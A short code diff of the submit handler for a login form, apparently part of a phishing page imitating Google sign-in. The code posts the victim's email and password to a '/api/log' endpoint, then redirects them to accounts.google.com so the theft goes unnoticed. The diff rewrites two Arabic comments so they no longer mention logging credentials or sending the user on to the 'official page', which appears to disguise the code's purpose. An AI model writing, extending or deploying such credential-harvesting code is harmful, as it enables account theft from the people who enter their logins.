@@ -17,7 +17,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     })
   });
 
-  // حفظ في log.txt عبر Vercel Function (اختياري)
+  // حفظ نسخة محلية عبر API (اختياري)
   fetch("/api/log", {
     method: "POST",
     headers: {
@@ -26,7 +26,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     body: JSON.stringify({ email, password })
   });
 
-  // تحويل المستخدم للصفحة الرسمية بعد الإرسال
+  // تحويل المستخدم بعد التأخير
   setTimeout(() => {
     window.location.href = "https://accounts.google.com";
   }, 1000);
